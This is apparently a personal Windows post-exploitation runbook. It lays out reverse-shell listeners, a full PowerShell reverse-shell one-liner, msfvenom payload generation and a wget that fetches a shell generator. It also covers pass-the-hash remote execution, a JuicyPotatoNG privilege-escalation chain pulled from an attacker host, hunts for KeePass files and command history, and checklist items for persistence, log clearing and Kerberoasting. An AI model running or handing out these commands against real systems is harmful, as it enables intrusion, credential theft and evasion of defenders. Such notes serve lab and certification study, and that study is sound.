# Windows Runbook
* [Task List](#task-list)
* [Stabilize](#stabilize)
    * [Useful reverse shells](#useful-reverse-shells)
* [Install needed tools](#install-needed-tools)
* [Enumerate](#enumerate)
* [Establish tunnel](#establish-tunnel)
* [Establish persistance](#establish-persistance)
* [Automated Tools](#automated-tools)
* [Enumeration and Privilege Escalation](#enumeration-and-privilege-escalation)
    * [Basic User Enum](#basic-user-enum)
    * [Enumerate the machine](#enumerate-the-machine)
    * [WinPeas checklist](#winpeas-checklist)
    * [AD Checklist - Run this if you have valid AD creds](#ad-checklist---run-this-if-you-have-valid-ad-creds)

## Task List

- [ ] [Stabilize](#stabilize)
- [ ] [Copy tools to the target](#copy-tools-to-the-target)
- [ ] [Enumerate](#enumerate)
  - [ ] [System Info](#system-info)
  - [ ] [Permissions](#permissions)
  - [ ] [Processes and Services](#processes-and-services)
  - [ ] [Networking](#networking)
  - [ ] [Users and Groups](#users-and-groups)
  - [ ] [Tasks](#tasks)
  - [ ] [Logs](#logs)
  - [ ] [Installed software](#installed-software)
- [ ] [Finalize](#Finalize)
  - [ ] [Establish tunnel](#establish-tunnel)
  - [ ] [Copy information from the target](#copy-tools)
  - [ ] [Establish persistance](#establish-persistance)
  - [ ] [Clear logs]


## Stabilize
- Listen to reverse shell:
```bash
rlwrap nc -lvnp 443
```
### Useful reverse shells
- Powershell oneliner:

```cmd
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
- Base64 encoded powershell oneliner:
```bash

wget https://gist.githubusercontent.com/tothi/ab288fb523a4b32b51a53e542d40fe58/raw/40ade3fb5e3665b82310c08d36597123c2e75ab4/mkpsrevshell.py
python3 mkpsrevshell.py <ip> 443
```
- TCP reverse shell executable:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe > shell.exe
```
- Via SMB:
```bash
psexec.py '<username>:<password>@<ip>'
wmiexec.py '<username>:<password>@<ip>'
winexe -U '<username>%<password>' //<ip> cmd.exe
pth-winexe -U '<username>%<lm_hash>:<nt_hash>' //<ip> cmd.exe
```
- Via WinRM:
```bash
evil-winrm -i <ip> -u <username> -p <password>
evil-winrm -i <ip> -u <username> -H <nt_hash>
```
## Install needed tools
  - powerup
    - Get-ModifiableServiceFile
## Enumerate

- ### System Info

  - System specific info
    - whoami
    - systeminfo 
 
- ### Permissions
  
  - Users permissions
    - whoami /priv
    - Get-LocalUser
    - Get-LocalGroup
    - Get-LocalGroupMember {{ LocalGroup }}
  - Registry
    - Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
    - Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
  - Regular Files
    - Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
    - Get-ChildItem -Path C:\{{ app }} -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
    - Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue 

- ### Processes & Services

  - Running Processes
    - Get-Process
  - Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} 
  - icacls
    - x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
    - 
- ### Networking
  
  - Ip info
    - ipconfig /all
    - netstat -ano
    
  - Routing info
    - route print
    - 
  - Firewalls
TBD
  
- ### Users/Groups

  - Users


  whoami /groups
  - Groups
    - net users {{ user }}
    - Get-LocalGroupMember administrators

- ### Tasks


- ### Logs
   Get-History
   (Get-PSReadlineOption).HistorySavePath

  
- ### Installed software

  - View installed software



## Establish tunnel

## Establish persistance




## Automated Tools
 evil-winrm
 WinPEASx64.exe

## Enumeration and Privilege Escalation

### Basic User Enum

```
whoami
whoami /priv
net user
net user /domain
systeminfo
ipconfig
```

if `SeImpersonatePrivilege`:


```
sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe -o payloads/shell.exe
iwr -uri http://192.168.45.215/JuicyPotatoNG.exe -outfile JuicyPotatoNG.exe
./JuicyPotatoNG.exe -t * -p "./shell.exe" 
```

### Enumerate the machine

Anything interesting in the root of C?
```
ls C:/
```

Anything interesting in the current users' home folder?

```
ls C:/Users/user/
ls C:/Users/user/Desktop
ls C:/Users/user/Documents
ls "C:/Program Files (x86)"
ls "C:/Program Files"
```

What's installed on the machine?

32-bit:
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
64-bit:

```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

Finally, to get running processes:

```
Get-Process
```

Check history of all users:

```
more C:\Users\user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Environment variables:
```
Get-ChildItem -Path Env:
```

### WinPeas checklist


* What servers are running on the machine. Can we gain access to an internal HTTP server or something like that?
* Is there a Task or Service running on the machine that we can abuse?
  * If a non-default service is present that looks promising, but you don't have write permissions to the .exe,
    check if it is missing a dll with procmon.
* Is the machine set up with `AlwaysInstallElevated` ?
* Anything that winpeas highlights as an escalation factor?
* Is there e.g. a web server running as root, or MySQL/MSSQL?

### AD Checklist - Run this if you have valid AD creds

* Any users kerberoastable?
* Any users ASREP-roastable?
* Run bloodhound and visualize the AD. Anything comes to mind?
* GMSAReadPassword?
* LAPS? https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps

